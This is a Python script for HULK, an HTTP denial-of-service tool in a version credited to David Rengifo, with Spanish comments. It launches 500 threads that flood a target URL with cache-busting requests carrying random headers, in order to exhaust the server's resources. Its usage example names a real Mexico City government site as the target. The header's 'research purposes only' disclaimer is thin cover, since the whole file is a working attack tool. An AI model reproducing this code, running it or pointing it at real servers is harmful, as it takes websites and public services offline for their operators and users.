# This is a Python script.
# Use python 3.x to run this
#
# Created with PyCharm 2022.2.1 (Community Edition)
# Build #PC-222.3739.56, built on August 16, 2022,
# Runtime version: 17.0.3+7-b469.37 amd64
# VM: OpenJDK 64-Bit Server VM by JetBrains s.r.o.
#
# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.

# ----------------------------------------------------------------------------------------------
# DOS - HTTP Unbearable Load King
#
# This tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
# to their knees by exhausting the resource pool, its is meant for research purposes only
# and any malicious usage of this tool is prohibited.
#
# author :  David Rengifo , version 1.1
# original author : Barry Shteiman, version 1.0
# ----------------------------------------------------------------------------------------------

# El módulo urllib.request usa HTTP/1.1 e incluye el encabezado Connection:close en sus peticiones HTTP.
from urllib import request as urlrequest
from urllib import error as error
import sys
import threading
import random
import re
import requests
import referers
import useragents


# global params
url = ''
host = ''
request_counter = 0
flag = 0
safe = 0
headers_useragents = []
headers_referers = []
print2console = False  # True : Habilita / False : Deshabilita la impresion a consola de las variables globales
debug = False  # True : Habilita / False : Deshabilita la impresion a consola de los errores


# print usage
def usage():
    print('---------------------------------------------------')
    print('USAGE: python dos.py <url>')
    print('EXAMPLE: python dos.py https://www.ssc.cdmx.gob.mx/')
    print('you can add "-safe" after url, to autoshut after dos')
    print('you can add "-print" after url, to view loaded global variables')
    print('---------------------------------------------------')


# Incrementa el contador
def inc_counter():
    global request_counter
    request_counter += 1


# Configura la bandera
def set_flag(val):
    global flag
    flag = val


# Enciende el modo safe
def set_safe():
    global safe
    safe = 1


# Enciende la impresion a consola de las variables globales
def set_print():
    global print2console
    print2console = True


# Enciende la impresion a consola de las variables globales
def set_debug():
    global debug
    debug = True


# builds random ascii string
def buildblock(size):
    out_str = ''
    for b in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str


# Check if arg is a URL
def check_url(x):
    # Expresión regular para url
    regex = r"(?i)\b((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'\".,<>?«»“”‘’]))"
    ck_url = re.findall(regex, x)
    if ck_url:
        print("La url en el argumento recibido es: ", [x[0] for x in ck_url])
        return [x[0] for x in ck_url]
    else:
        print("¡No hay URL presente!")
        sys.exit()


# Check if URL is online
# Code taken from: https://pytutorial.com/check-url-is-reachable
def isonline():
    try:
        # Get Url
        get = requests.get(url)
        # if the request succeeds
        website_is_up = get.status_code == 200
    # Exception
    except requests.exceptions.RequestException as e:
        # print URL with Errs
        raise SystemExit(f"{url}: is Not reachable \nErr: {e}")
    except error.URLError as ex:
        print("Check URL Status Failed")
        print("Error: [%s]" % ex.reason)
        sys.exit()
    else:
        if website_is_up:
            print(f"{url}: is reachable")
        else:
            print(f"{url}: is Not reachable, status_code: {get.status_code}")
    return website_is_up


# Load Global Variables
def load_globals_variables():
    global headers_useragents
    global headers_referers
    headers_useragents = useragents.get_useragent_list()
    if print2console:
        print("headers_useragents")
        print(headers_useragents)
        print("\n")
    headers_referers = referers.get_referer_list()
    headers_referers.append('http://' + host + '/')
    headers_referers.append('https://' + host + '/')
    if print2console:
        print("headers_referers")
        print(headers_referers)
        print("\n")
    print("Global Variables Loaded\n")


# Add headers to request
def addheaders(req):
    req.add_header('User-Agent', random.choice(headers_useragents))
    req.add_header('Cache-Control', 'no-cache')
    req.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    req.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    req.add_header('Connection', 'keep-alive')
    req.add_header('Keep-Alive', "timeout=5, max=%d" % random.randint(110, 120))
    req.add_header('Host', host)
    return req


# http request
def httpcall(xurl):
    code = 0
    if xurl.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    req = urlrequest.Request(
        xurl + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request = addheaders(req)

    try:
        urlrequest.urlopen(request)
    except error.HTTPError as e:
        if debug:
            print("Response Code: [%d]" % e.code)
        set_flag(1)
        code = 500
    except error.URLError as e:
        if debug:
            print("ERROR: [%s]" % e.reason)
        sys.exit()
    else:
        inc_counter()
        urlrequest.urlopen(request)
    return code


# http caller thread
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if (code == 500) & (safe == 1):
                    set_flag(2)
        except Exception as ex:
            if debug:
                print('type error is:', ex.__class__.__name__)
            pass


# monitors http threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous+100 < request_counter) & (previous != request_counter):
                print("%d Requests Sent" % request_counter)
                previous = request_counter
        if flag == 2:
            print("\n-- DOS Attack Finished --")


# execute
if len(sys.argv) < 2 or ("-help" in sys.argv):
    usage()
else:
    if len(sys.argv) >= 3:
        if "-safe" in sys.argv:
            sys.argv.remove('-safe')
            set_safe()
        if "-print" in sys.argv:
            sys.argv.remove('-print')
            set_print()
        if "-debug" in sys.argv:
            sys.argv.remove('-debug')
            set_debug()
    url = check_url(' '.join(sys.argv))[0]
    if url.count("/") == 2:
        url = url + "/"
    m = re.search('(https?://)?([^/]*)/?.*', url)
    host = m.group(2)

    # Load global variables
    print("Load global variables...\n")
    load_globals_variables()
    if isonline():
        print("-- DOS Attack Started --")
        for i in range(500):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
    else:
        print("%s is down or not accessible" % url)
